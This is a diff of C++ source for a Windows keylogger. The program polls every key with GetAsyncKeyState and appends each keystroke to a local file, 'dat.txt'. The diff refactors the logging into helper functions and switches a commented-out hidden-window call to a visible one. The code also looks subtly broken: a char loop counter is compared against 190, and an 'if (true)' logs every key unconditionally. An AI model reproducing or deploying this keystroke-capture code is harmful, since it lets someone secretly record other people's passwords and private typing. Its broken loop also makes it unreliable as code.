@@ -3,19 +3,23 @@
 #include <iostream>
 #include <fstream>
 
-
-
 using namespace std;
 
 
-
-void LOG(string input) {
+void save(string input) {
+	cout << input;
 	fstream LogFile;
 	LogFile.open("dat.txt", fstream::app);
 	if (LogFile.is_open()) {
 		LogFile << input;
 		LogFile.close();
 	}
+}
+
+void save(char input) {
+	string str = "";
+	str += input;
+	save(str);
 }
 
 
@@ -58,24 +62,18 @@ string parseUnprintable(int S_key) {
 
 int main()
 {
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_SHOW);
 
 	while (true) {
 		Sleep(10);
-		for (int key = 8; key <= 190; key++)
+		for (char key = 8; key <= 190; key++)
 		{
 			if (GetAsyncKeyState(key) == -32767) {
+				if (parseUnprintable(key) != "")
+					save(parseUnprintable(key));
 
-
-				if (parseUnprintable(key)) {
-
-					fstream LogFile;
-					LogFile.open("dat.txt", fstream::app);
-					if (LogFile.is_open()) {
-						LogFile << char(key);
-						LogFile.close();
-					}
-
+				if (true) {
+					save(key);
 				}
 			}
 		}
